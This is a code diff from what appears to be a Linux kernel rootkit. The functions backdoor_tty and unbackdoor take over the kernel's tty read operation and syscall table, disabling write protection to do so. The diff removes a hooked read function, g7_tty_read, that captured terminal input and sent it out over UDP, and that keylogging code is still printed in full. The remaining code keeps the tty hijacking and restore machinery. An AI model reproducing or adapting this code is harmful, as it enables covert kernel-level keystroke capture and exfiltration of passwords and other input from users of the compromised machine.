@@ -8,10 +8,6 @@
 #include "hook.h"
 #include "inputlog.h"
 
-atomic_t tty_read_count;
-
-ssize_t (*current_tty_read)(struct file *, char *, size_t, loff_t *);
-
 void
 backdoor_read(void)
 {
@@ -23,8 +19,8 @@ backdoor_read(void)
 void
 backdoor_tty(void)
 {
-    if (!current_tty_read) {
-        current_tty_read
+    if (!sys_tty_read) {
+        sys_tty_read
             = ((struct file_operations *)kallsyms_lookup_name("tty_fops"))->read;
 
         disable_protection();
@@ -34,32 +30,21 @@ backdoor_tty(void)
     }
 }
 
-ssize_t
-g7_tty_read(struct file *file, char *buf, size_t count, loff_t *off)
-{
-    atomic_inc(&tty_read_count);
-    ssize_t ret = current_tty_read(file, buf, count, off);
-    handle_pid(current->pid, buf, count);
-    send_udp(buf, count);
-    atomic_dec(&tty_read_count);
-    return ret;
-}
-
 void
 unbackdoor(void)
 {
     int cur;
 
-    if (current_tty_read) {
+    if (sys_tty_read) {
         disable_protection();
         ((struct file_operations *)kallsyms_lookup_name("tty_fops"))->read
-            = (void *)current_tty_read;
+            = (void *)sys_tty_read;
         enable_protection();
 
         while ((cur = atomic_read(&tty_read_count)) > 0)
             msleep(250);
 
-        current_tty_read = NULL;
+        sys_tty_read = NULL;
     } else if (sys_read) {
         disable_protection();
         sys_calls[__NR_read] = (void *)sys_read;
